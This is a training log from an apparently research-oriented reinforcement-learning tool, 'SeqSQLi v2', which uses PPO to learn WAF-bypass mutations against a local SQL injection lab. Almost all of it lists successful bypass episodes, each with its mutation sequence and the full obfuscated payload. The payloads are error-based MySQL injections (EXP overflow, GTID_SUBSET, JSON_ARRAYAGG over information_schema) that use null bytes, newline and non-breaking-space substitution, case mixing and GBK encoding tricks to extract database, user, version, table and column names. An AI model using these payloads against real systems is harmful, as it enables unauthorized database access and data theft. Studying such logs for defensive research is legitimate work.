/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  [BYPASS] Ep 5869 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(SElecT%0a*%0aFROM%0a(SELEcT%0a(dAtABaSE%a0()))a));%00
  Ep 5870 | SR=30% | Steps=12.7 | R=-26.91
  [BYPASS] Ep 5871 | steps=6 | seq=hex_to_char -> func_sp_nbsp -> null_byte -> agg_swap -> newline -> case
           payload: 1'%0aaNd%0aEXP(~(selECt%0a*%0afrOm%0a(sElEcT%0a((sEleCT%0acoNcAT(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0afROM%0ainFOrmATioN_scHeMA.TABles%0aW
  [BYPASS] Ep 5878 | steps=11 | seq=func_sp_nbsp -> newline -> hex_to_char -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> func_sp_tab -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(sEleCt%0a*%0afrom%0a(SElECt%0a((seLEcT%0aJSON_ARRAYAGG(CONCAT(taBle_schema,CHAR(46),taBLE_name))%0afRoM%0aInfoRMaTiOn_SCheMa.TAbLEs%0
  Ep 5880 | SR=20% | Steps=13.7 | R=-32.31
  [BYPASS] Ep 5881 | steps=12 | seq=hex_to_char -> agg_swap -> newline -> agg_swap -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(seLeCt%0a*%0aFROM%0a(SELeCt%0a((SElECt%0acONCAt(CHAR(124),JSON_ARRAYAGG(tablE_name),CHAR(124))%0afrOM%0ainFORMation_ScHeMa.tABLes%0aW
  [BYPASS] Ep 5887 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(sELECt%0a*%0aFrOM%0a(seLecT%0a((seLect%0aJSON_ARRAYAGG(column_name)%0aFrom%0ainfORmAtiOn_ScHEMA.columns%0aWhere%0atABle_schema=DatABA
  Ep 5890 | SR=20% | Steps=13.8 | R=-32.80
  [BYPASS] Ep 5892 | steps=9 | seq=newline -> null_byte -> agg_swap -> null_byte -> newline -> null_byte -> ver_newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5893 | steps=8 | seq=newline -> agg_swap -> func_sp_nbsp -> dot_prefix -> case -> func_sp_nbsp -> agg_swap -> null_byte
           payload: .11'%0aanD%0aEXP(~(SEleCt%0a*%0aFRoM%0a(sELEcT%0a((SeLecT%0aJSON_ARRAYAGG(TAbLE_name)%0aFRom%0aiNFOrMATioN_schema.tabLes%0aWhErE%0atablE_schema=databa
  Ep 5900 | SR=20% | Steps=13.7 | R=-34.08
  [BYPASS] Ep 5901 | steps=7 | seq=keyword_split -> func_sp_nbsp -> null_byte -> agg_swap -> case -> backtick -> newline
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5904 | steps=5 | seq=newline -> func_sp_nbsp -> case -> case -> null_byte
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5905 | steps=8 | seq=hex_to_char -> func_sp_nbsp -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(selEct%0a*%0aFROm%0a(SElECT%0a((sELeCT%0acONcaT(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0afROM%0ainFoRMatiOn_SChEma.TabLes%0aW
  [BYPASS] Ep 5909 | steps=7 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(SeLect%0a*%0afRoM%0a(SELEcT%0a(user%a0()))a));%00
  Ep 5910 | SR=40% | Steps=11.7 | R=-22.74
  [BYPASS] Ep 5912 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SEleCt%0a*%0aFRom%0a(seLecT%0a((SELecT%0aJSON_ARRAYAGG(tabLe_name)%0aFROM%0aiNFoRmAtiON_schEmA.tABLEs%0aWhere%0ataBLE_schema=DATABaSE
  [BYPASS] Ep 5913 | steps=4 | seq=ver_newline -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5915 | steps=11 | seq=agg_swap -> newline -> agg_swap -> hex_to_char -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> null_byte -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SElEcT%0a*%0aFrOM%0a(sElEcT%0a((selEcT%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aINFORMATiOn_SCHEMa.schemata)))a));%00
  [BYPASS] Ep 5916 | steps=8 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(seLECt%0a*%0aFroM%0a(SELeCT%0a((SElect%0aJSON_ARRAYAGG(TAbLE_name)%0aFROm%0ainFORmATION_SchEMA.tablEs%0aWHeRe%0ataBle_schema=dAtaBAse
  [BYPASS] Ep 5920 | steps=9 | seq=hex_to_char -> newline -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(sELEcT%0a*%0aFRoM%0a(sELeCt%0a((sEleCt%0aJSON_ARRAYAGG(CONCAT(TaBlE_schema,CHAR(46),tABLE_name))%0aFrOm%0aiNFoRmatioN_sCHeMa.tablEs%0
  Ep 5920 | SR=50% | Steps=11.3 | R=-21.02
  [BYPASS] Ep 5921 | steps=4 | seq=agg_swap -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5922 | steps=7 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(selEcT%0a*%0aFroM%0a(SeLeCt%0a((SelecT%0aJSON_ARRAYAGG(column_name)%0afrom%0aInfOrMaTIoN_SChEmA.columns%0aWhERE%0atablE_schema=DataBa
  [BYPASS] Ep 5925 | steps=5 | seq=func_sp_nbsp -> null_byte -> newline -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SELEct%0a*%0aFROm%0a(sELEct%0a(dAtAbaSe%a0()))a));%00
  [BYPASS] Ep 5927 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SELEcT%0a*%0aFRom%0a(sELECT%0a(DaTaBaSE%a0()))a));%00
  Ep 5930 | SR=40% | Steps=11.0 | R=-21.29
  [BYPASS] Ep 5934 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5939 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 5940 | SR=20% | Steps=12.7 | R=-28.66
  [BYPASS] Ep 5943 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_ff -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(SeLect%0a*%0afRom%0a(selEcT%0a(DATaBase%a0()))a));%00
  [BYPASS] Ep 5946 | steps=10 | seq=newline -> func_sp_nbsp -> agg_swap -> agg_swap -> agg_swap -> func_sp_tab -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(SelEct%0a*%0afrOm%0a(selECT%0a((SelECT%0aJSON_ARRAYAGG(column_name)%0aFrOm%0aiNFORmATion_sCheMA.columns%0aWheRE%0aTable_schema=dATaBA
  [BYPASS] Ep 5948 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5950 | SR=30% | Steps=12.5 | R=-27.97
  [BYPASS] Ep 5953 | steps=8 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(seLeCt%0a*%0aFROm%0a(seLEct%0a(version%a0()))a));%00
  Ep 5960 | SR=10% | Steps=14.3 | R=-34.92
  [BYPASS] Ep 5961 | steps=4 | seq=newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(SElecT%0a*%0afroM%0a(sElECT%0a(user%a0()))a));%00
  [BYPASS] Ep 5967 | steps=13 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case -> formfeed -> null_byte -> case -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SELeCT%0a*%0aFRoM%0a(sElECT%0a((SelECT%0aJSON_ARRAYAGG(column_name)%0afrOM%0aINfORMation_schEmA.columns%0awHeRE%0atABLe_schema=DataBa
  [BYPASS] Ep 5968 | steps=14 | seq=hex_to_char -> func_sp_nbsp -> newline -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> newline -> null_byte -> case -> case -> case -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aand%0aEXP(~(sElECt%0a*%0afRoM%0a(sElEct%0a((SEleCT%0aJSON_ARRAYAGG(CONCAT(tablE_schema,CHAR(46),TABLE_name))%0afrOm%0ainfOrMATioN_sCHEMA.tablEs%0
  Ep 5970 | SR=30% | Steps=13.6 | R=-31.12
  [BYPASS] Ep 5980 | steps=8 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> func_sp_nbsp -> case -> gbk_bypass -> null_byte
           payload: 1%bf%27%0aand%0aGTID_SUBSET((DATabASE%a0()),1);%00
  Ep 5980 | SR=10% | Steps=14.3 | R=-34.48
  [BYPASS] Ep 5985 | steps=5 | seq=func_sp_nbsp -> null_byte -> case -> case -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5990 | SR=10% | Steps=14.0 | R=-34.86
  [BYPASS] Ep 5993 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> concat_char -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(sELect%0a*%0afRoM%0a(sElecT%0a(version%a0()))a));%00
  [BYPASS] Ep 5997 | steps=6 | seq=newline -> null_byte -> case -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((DATabasE%a0()),1);%00
  Ep 6000 | SR=20% | Steps=13.3 | R=-31.42
  [BYPASS] Ep 6006 | steps=12 | seq=null_byte -> hex_to_char -> null_byte -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> agg_swap -> newline -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(SEleCt%0a*%0aFrom%0a(seLeCt%0a((SeLECT%0aJSON_ARRAYAGG(conCAT(taBLE_schema,CHAR(46),tABLE_name))%0afrOM%0aINFOrMATIon_SChEMa.taBles%0
  [BYPASS] Ep 6007 | steps=10 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SElECt%0a*%0aFrom%0a(SELect%0a(user%a0()))a));%00
  [BYPASS] Ep 6008 | steps=12 | seq=null_byte -> hex_to_char -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> case -> null_byte -> case_split -> func_sp_nbsp -> agg_swap -> func_sp_tab -> crlf
           payload: 1'%0d%0aand%0d%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6009 | steps=7 | seq=newline -> gbk_bypass -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1%bf%27%0aaNd%0aEXP(~(sELECT%0a*%0afrOM%0a(seLEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 6010 | steps=5 | seq=newline -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SelEct%0a*%0aFRom%0a(selEcT%0a((SEleCT%0aJSON_ARRAYAGG(column_name)%0afrOM%0ainFORmaTIOn_scHEMa.columns%0awhErE%0aTAbLe_schema=datAba
  Ep 6010 | SR=50% | Steps=12.1 | R=-23.90
  [BYPASS] Ep 6016 | steps=5 | seq=dot_prefix -> newline -> null_byte -> case -> func_sp_nbsp
           payload: .11'%0aand%0aEXP(~(SeLeCt%0a*%0afRom%0a(sELEct%0a(version%a0()))a));%00
  [BYPASS] Ep 6017 | steps=6 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aANd%0aEXP(~(sElect%0a*%0afrOm%0a(SelECT%0a((seleCT%0aJSON_ARRAYAGG(tAblE_name)%0aFrOm%0ainFOrMATiOn_scHeMa.TAbLes%0awhere%0aTAbLe_schema=databasE
  [BYPASS] Ep 6018 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6020 | SR=30% | Steps=11.9 | R=-25.71
  [BYPASS] Ep 6027 | steps=15 | seq=func_sp_nbsp -> case -> func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> case -> case -> agg_swap -> case -> case -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aANd%0aEXP(~(SeleCT%0a*%0aFroM%0a(SElEct%0a(version%a0()))a));%00
  [BYPASS] Ep 6030 | steps=4 | seq=agg_swap -> crlf -> null_byte -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6030 | SR=20% | Steps=13.9 | R=-31.49
  [BYPASS] Ep 6033 | steps=14 | seq=newline -> newline -> func_sp_nbsp -> agg_swap -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_tab -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SEleCt%0a*%0aFrOm%0a(SelECt%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0afrom%0aInFoRmATIOn_Schema.schemata)))a));%00
  [BYPASS] Ep 6039 | steps=4 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6040 | SR=20% | Steps=13.8 | R=-32.28
  [BYPASS] Ep 6041 | steps=8 | seq=func_sp_nbsp -> agg_swap -> newline -> null_byte -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(seLecT%0a*%0afROm%0a(SELeCt%0a((SELeCt%0aJSON_ARRAYAGG(TaBLE_name)%0aFROm%0aiNfoRmaTion_SchemA.TABles%0aWheRe%0atAbLe_schema=DatabASe
  [BYPASS] Ep 6043 | steps=6 | seq=newline -> null_byte -> case -> agg_swap -> null_byte -> func_sp_nbsp
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6046 | steps=6 | seq=func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> concat_char -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6050 | steps=8 | seq=func_sp_nbsp -> null_byte -> func_sp_nbsp -> newline -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(SELEct%0a*%0aFrOM%0a(SeLecT%0a(version%a0()))a));%00
  Ep 6050 | SR=40% | Steps=11.8 | R=-24.18
  [BYPASS] Ep 6059 | steps=13 | seq=dot_prefix -> newline -> hex_to_char -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> func_sp_nbsp -> func_sp_tab -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: .11'%0aAnd%0aEXP(~(SElECT%0a*%0afrom%0a(SeLeCt%0a((seLECt%0aJSON_ARRAYAGG(CONCAT(TaBle_schema,CHAR(46),TABLE_name))%0aFRom%0ainfoRmaTioN_sCHEma.TaBLEs
  Ep 6060 | SR=10% | Steps=14.8 | R=-35.92
  [BYPASS] Ep 6070 | steps=5 | seq=case -> nested_union -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6070 | SR=10% | Steps=14.0 | R=-35.52
  [BYPASS] Ep 6072 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> newline -> func_sp_tab -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(seLect%0a*%0aFROm%0a(SElect%0a(version%a0()))a));%00
  [BYPASS] Ep 6074 | steps=6 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6075 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6080 | steps=10 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> newline -> newline -> agg_swap -> case -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%0aand%0aEXP(~(selECT%0a*%0aFRom%0a(seLecT%0a((SELect%0aJSON_ARRAYAGG(schema_name)%0afrOM%0ainforMaTion_sChemA.schemata)))a));%00
  Ep 6080 | SR=40% | Steps=11.7 | R=-25.30
  [BYPASS] Ep 6081 | steps=7 | seq=newline -> null_byte -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> agg_swap
           payload: 1'%0aand%0aEXP(~(seLeCT%0a*%0afRom%0a(SELEcT%0a((SeLECT%0aJSON_ARRAYAGG(TABlE_name)%0aFROM%0ainFORMATION_schEMA.tAbLes%0aWHEre%0ataBlE_schema=dATaBAsE
  [BYPASS] Ep 6087 | steps=4 | seq=case -> null_byte -> func_sp_nbsp -> newline
           payload: 1'%0aAnd%0aEXP(~(seLEct%0a*%0aFrOM%0a(SelecT%0a(dataBAse%a0()))a));%00
  [BYPASS] Ep 6088 | steps=6 | seq=agg_swap -> newline -> hex_to_char -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aEXP(~(sElECT%0a*%0afrom%0a(seleCT%0a((sElEct%0aJSON_ARRAYAGG(TabLe_name)%0aFrOm%0aiNfORmatION_SChEmA.TabLEs%0aWheRe%0atable_schema=dAtAbaSe
  Ep 6090 | SR=30% | Steps=12.2 | R=-26.50
  [BYPASS] Ep 6092 | steps=12 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(seLECt%0a*%0aFrom%0a(seLect%0a((SELecT%0aJSON_ARRAYAGG(tABLe_name)%0afrom%0aINFORMAtIoN_schemA.tAbLes%0aWHere%0atABLe_schema=DATAbAse
  [BYPASS] Ep 6097 | steps=8 | seq=null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case -> newline
           payload: 1'%0aAnd%0aEXP(~(SelEct%0a*%0afRoM%0a(SElECT%0a((SELEcT%0aJSON_ARRAYAGG(column_name)%0afrom%0aInforMatioN_SChEMA.columns%0awHERe%0ataBlE_schema=DatABA
  [BYPASS] Ep 6098 | steps=10 | seq=dot_prefix -> null_byte -> null_byte -> newline -> case -> null_byte -> case -> case -> formfeed -> func_sp_nbsp
           payload: .11'%0aAND%0aGTID_SUBSET((dATaBaSe%a0()),1);%00
  Ep 6100 | SR=30% | Steps=13.5 | R=-30.42
  [BYPASS] Ep 6105 | steps=10 | seq=case -> func_sp_nbsp -> newline -> null_byte -> case -> func_sp_nbsp -> func_sp_nbsp -> case -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SELecT%0a*%0afrOm%0a(SelecT%0a((SElecT%0aJSON_ARRAYAGG(column_name)%0afROm%0aiNFoRmAtION_SCHema.columns%0aWHere%0atABle_schema=dATABa
  [BYPASS] Ep 6108 | steps=4 | seq=func_sp_nbsp -> case -> newline -> null_byte
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6110 | steps=9 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> case -> case_split -> null_byte
           payload: 1'%0aANd%0aEXP(~(sElEcT%0a*%0aFroM%0a(SeleCT%0a((SEleCt%0aJSON_ARRAYAGG(tAbLE_name)%0aFrOM%0aiNFormAtiOn_SCHeMA.TAbLes%0awherE%0aTaBLE_schema=DatAbaSE
  Ep 6110 | SR=30% | Steps=12.8 | R=-27.10
  [BYPASS] Ep 6113 | steps=9 | seq=null_byte -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> null_byte -> null_byte -> formfeed
           payload: 1'%0cAND%0cGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 6115 | steps=8 | seq=newline -> agg_swap -> agg_swap -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SelECt%0a*%0afRom%0a(SeLECT%0a(version%a0()))a));%00
  [BYPASS] Ep 6116 | steps=10 | seq=case -> crlf -> crlf -> func_sp_nbsp -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLeCT%0d%0a*%0d%0afRom%0d%0a(SELEcT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(taBLE_name)%0d%0afROm%0d%0aInFORmatIon_sCHEmA.tAbLes%0d%0
  [BYPASS] Ep 6119 | steps=6 | seq=newline -> func_sp_nbsp -> func_sp_tab -> agg_swap -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(SEleCT%0a*%0afrOm%0a(SeleCT%0a((SElEcT%0aJSON_ARRAYAGG(column_name)%0afrOm%0ainFormAtIOn_sChemA.columns%0awhere%0aTABLE_schema=dAtABA
  Ep 6120 | SR=40% | Steps=12.3 | R=-26.12
  [BYPASS] Ep 6122 | steps=5 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaNd%0aEXP(~(seLeCt%0a*%0aFrOM%0a(selEct%0a(user%a0()))a));%00
  [BYPASS] Ep 6124 | steps=7 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> crlf -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(SeLeCt%0a*%0aFrOM%0a(seLECt%0a((SeLeCt%0aJSON_ARRAYAGG(column_name)%0aFrom%0aInfORMaTIoN_SCHEMA.columns%0awHere%0atABlE_schema=daTaBa
  [BYPASS] Ep 6128 | steps=10 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(sELeCt%0a*%0afrOm%0a(SElECT%0a((SelECt%0aJSON_ARRAYAGG(CONcaT(TAblE_schema,CHAR(46),TablE_name))%0aFrOM%0ainFoRMatIoN_scHeMa.TablEs%0
  Ep 6130 | SR=30% | Steps=12.7 | R=-28.31
  [BYPASS] Ep 6132 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SElect%0a*%0aFRoM%0a(sELECt%0a(daTAbase%a0()))a));%00
  [BYPASS] Ep 6133 | steps=4 | seq=null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seLECT%0a*%0afrOm%0a(sEleCT%0a(DAtabASe%a0()))a));%00
  [BYPASS] Ep 6137 | steps=13 | seq=case_split -> func_sp_nbsp -> func_sp_tab -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> newline -> null_byte -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SeLECT%0a*%0afRoM%0a(SElECt%0a((SELECt%0aJSON_ARRAYAGG(TaBLE_name)%0aFrom%0ainfOrMaTiOn_SCheMA.tAbLes%0awHErE%0aTABLe_schema=dATABaSE
  Ep 6140 | SR=30% | Steps=12.6 | R=-26.82
  [BYPASS] Ep 6141 | steps=9 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(seLECt%0a*%0afrom%0a(seLECT%0a((sElecT%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aiNfoRMATioN_sChema.schemata)))a));%00
  [BYPASS] Ep 6143 | steps=8 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(sELect%0a*%0afrOm%0a(SElecT%0a((SElEct%0aJSON_ARRAYAGG(TabLE_name)%0aFRom%0ainforMAtIoN_ScHEma.taBles%0aWhEre%0aTaBlE_schema=DAtabaSE
  [BYPASS] Ep 6148 | steps=5 | seq=between_space -> null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%a0AND%a0GTID_SUBSET((database%a0()),1);%00
  Ep 6150 | SR=30% | Steps=12.7 | R=-29.32
  [BYPASS] Ep 6152 | steps=8 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> null_byte -> case -> newline -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(selEct%0a*%0aFrom%0a(sELEcT%0a((sELeCt%0aJSON_ARRAYAGG(column_name)%0aFRoM%0aINfORmaTION_sCHEma.columns%0aWHere%0aTable_schema=dATAba
  [BYPASS] Ep 6153 | steps=10 | seq=newline -> null_byte -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_tab -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aAnd%0aEXP(~(SELect%0a*%0aFRom%0a(sEleCT%0a((SELEcT%0aJSON_ARRAYAGG(schema_name)%0afROm%0aiNfORMATion_schemA.schemata)))a));%00
  [BYPASS] Ep 6155 | steps=5 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SeLect%0a*%0aFROM%0a(seLEcT%0a(version%a0()))a));%00
  Ep 6160 | SR=30% | Steps=12.8 | R=-27.67
  [BYPASS] Ep 6164 | steps=5 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aaND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6166 | steps=4 | seq=func_sp_nbsp -> case -> newline -> null_byte
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
